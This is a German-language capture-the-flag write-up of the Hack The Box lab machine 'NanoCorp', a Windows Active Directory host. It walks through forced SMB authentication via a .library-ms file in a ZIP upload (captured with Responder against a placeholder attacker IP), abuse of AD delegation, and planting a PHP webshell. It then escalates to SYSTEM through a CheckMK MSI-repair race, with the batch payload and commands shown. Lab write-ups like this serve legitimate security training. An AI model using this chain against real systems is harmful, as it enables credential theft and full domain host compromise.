# Hack The Box: NanoCorp Writeup

> Public-safe Writeup. Flags sind absichtlich nicht enthalten.

## Überblick

NanoCorp ist eine Windows/Active-Directory-Maschine rund um eine Hiring-Webanwendung, AD-Delegation und einen lokalen CheckMK-Agent-Privesc. Die Chain kombiniert einen Web-Upload, erzwungene SMB-Authentifizierung, Kerberos/WinRM-Pivoting und eine CheckMK MSI-Repair-Race-Condition bis SYSTEM.

## Recon

Ziel:

```text
10.129.243.199
```

Domain/Hosts:

```text
nanocorp.htb
DC01 / dc01.nanocorp.htb
hire.nanocorp.htb
```

Relevante Dienste:

```text
53/tcp    DNS
80/tcp    HTTP Apache/2.4.58 Win64 PHP/8.2.12
88/tcp    Kerberos
135/tcp   MSRPC
139/tcp   NetBIOS
389/tcp   LDAP
445/tcp   SMB
636/tcp   LDAPS
3268/tcp  Global Catalog
3269/tcp  Global Catalog SSL
3389/tcp  RDP
5986/tcp  WinRM HTTPS
6556/tcp  CheckMK Agent 2.1.0p10
9389/tcp  ADWS
```

Der interessante Web-VHost war `hire.nanocorp.htb`. Dort gab es eine Bewerbungs-/Resume-Funktion mit ZIP-Upload.

## Foothold: Outbound SMB Authentication über ZIP Upload

Die Hiring-App akzeptierte ZIP-Dateien. In einem ZIP wurde eine Windows-Datei platziert, die beim serverseitigen Verarbeiten eine SMB-Verbindung zu meiner VPN-IP auslöste.

Prinzip:

```text
ZIP upload
  -> Windows verarbeitet Datei/Metadaten
  -> Ziel versucht \\<attacker-vpn-ip>\share zu erreichen
  -> Responder fängt NetNTLMv2 ein
```

Payload-Idee:

```text
.library-ms mit SMB-Referenz auf \\<HTB_TUN_IP>\SHARE\icon.ico
```

Auf dem VPN-Interface lief Responder. Dadurch wurde ein NetNTLMv2-Hash für den Domain-Account `NANOCORP\web_svc` gefangen. Der Hash war mit RockYou crackbar.

## AD Enumeration und Delegation

Mit den `web_svc` Credentials wurde LDAP/AD enumeriert. Der relevante Fund war eine delegierte Rechtekette:

```text
web_svc
  -> AddSelf auf Gruppe IT_Support
  -> IT_Support kann monitoring_svc Passwort zurücksetzen
  -> monitoring_svc ist in Remote Management Users
  -> WinRM über HTTPS auf 5986
```

Wichtig: `monitoring_svc` war Mitglied von `Protected Users`. Dadurch waren NTLM und einfache Authentifizierungswege unzuverlässig oder blockiert. Kerberos war hier der richtige Weg.

Nach dem Zurücksetzen/Validieren des `monitoring_svc` Passworts wurde eine Kerberos-Session aufgebaut und WinRM über HTTPS verwendet.

## Pivot zurück zur Web-Ausführung

Die WinRM-Session lief als `monitoring_svc`. Auf dem Host war der XAMPP-Webroot für die Hiring-App durch den Kontext erreichbar/beschreibbar. Dadurch konnte ein kleiner PHP-Command-Wrapper in den Webroot geschrieben werden.

Der PHP-Wrapper wurde über `hire.nanocorp.htb` aufgerufen und lief als:

```text
NANOCORP\web_svc
```

Das war wichtig, weil der spätere CheckMK-Privesc aus dem Web-/Service-Kontext zuverlässiger war als direkt aus WinRM.

## Local Privilege Escalation: CheckMK Agent 2.1.0p10

Auf TCP 6556 lief CheckMK Agent `2.1.0p10`. Der Agent/Installer war anfällig für eine lokale Privilege Escalation im Stil von CVE-2024-0670: Beim MSI-Repair werden temporäre Skriptdateien mit vorhersagbaren Namen verwendet.

Ziel war, vor dem Repair passende Dateien zu platzieren:

```text
C:\Windows\Temp\cmk_all_<pid>_<ctr>.cmd
```

Die Dateien wurden als read-only Batch-Dateien angelegt und enthielten nur einfache Proof-/Copy-Kommandos, z.B.:

```bat
@echo off
whoami > C:\Users\Public\cmk_whoami.txt 2>&1
type C:\Users\monitoring_svc\Desktop\user.txt > C:\Users\Public\user.txt 2>&1
type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\root.txt 2>&1
icacls C:\Users\Public\root.txt /grant Everyone:F /C >> C:\Users\Public\cmk_acl.txt 2>&1
icacls C:\Users\Public\user.txt /grant Everyone:F /C >> C:\Users\Public\cmk_acl.txt 2>&1
```

Dann wurde die MSI-Reparatur gestartet:

```powershell
msiexec.exe /fa "C:\Windows\Installer\<cached-checkmk-msi>.msi" /qn /l*vx C:\Windows\Temp\cmk_repair_flags.log
```

## Kritischer Privesc-Fix: Working Directory

Der wichtigste Debugging-Punkt war das Working Directory. Mehrere Versuche erzeugten passende `cmk_all_<CLIENTPROCESSID>_*.cmd` Dateien und der MSI-Repair lief erfolgreich durch, aber der Payload wurde nicht ausgeführt.

Der Unterschied war im MSI-Log sichtbar:

```text
CURRENTDIRECTORY=C:\Windows\system32   -> Repair erfolgreich, Payload läuft nicht
CURRENTDIRECTORY=C:\Windows\Temp       -> Payload läuft als SYSTEM
```

Deshalb musste der RunasCs-Aufruf den Prozess explizit aus `C:\Windows\Temp` starten:

```cmd
cmd.exe /c cd /d C:\Windows\Temp && powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\bad_copyflags.ps1 -MinPID 1000 -MaxPID 15000
```

Der erfolgreiche MSI-Log enthielt danach:

```text
CURRENTDIRECTORY=C:\Windows\Temp
CLIENTPROCESSID=<pid>
Product: Check MK Agent 2.1 -- Configuration completed successfully.
```

Der Proof war:

```text
C:\Users\Public\cmk_whoami.txt -> nt authority\system
```

Damit konnten `user.txt` und `root.txt` nach `C:\Users\Public` kopiert und gelesen werden.

## Kill Chain

```text
hire.nanocorp.htb ZIP upload
  -> .library-ms outbound SMB auth
  -> Responder captures NetNTLMv2 for web_svc
  -> crack web_svc password
  -> LDAP/AD delegation enumeration
  -> web_svc adds itself to IT_Support
  -> reset/validate monitoring_svc for Kerberos
  -> WinRM HTTPS as monitoring_svc
  -> write PHP command wrapper into hire webroot
  -> execute commands as web_svc via webshell
  -> CheckMK Agent 2.1.0p10 MSI repair race
  -> force CURRENTDIRECTORY=C:\Windows\Temp
  -> SYSTEM command execution
  -> read user/root flags
```

## Takeaways

- Bei Windows-/AD-Boxen mit Upload-Flächen lohnen sich Outbound-Auth-Payloads früh, besonders `.library-ms`, `.url` oder ähnliche Windows-Referenzen.
- `Protected Users` zwingt oft zu Kerberos-first statt NTLM/simple bind.
- Nach AD-Gruppenänderungen Rechte und Token-Kontext neu validieren; nicht blind weiterarbeiten.
- Management-Agenten auf hohen Ports, hier CheckMK auf 6556, können entscheidende Privesc-Hinweise liefern.
- Bei MSI-/CheckMK-Privesc nicht nur auf Datei-Existenz prüfen. Entscheidend sind MSI-Log, `CURRENTDIRECTORY`, `CLIENTPROCESSID` und ein echtes SYSTEM-Output-Artefakt.
- Inline-Kommandos zum Kopieren von Proof-Dateien sind zuverlässiger als sofort Reverse Shells oder Custom-EXEs.

## Public Safety

Flags, private Schlüssel, vollständige Hashes und unnötige Secrets wurden aus diesem Writeup entfernt.
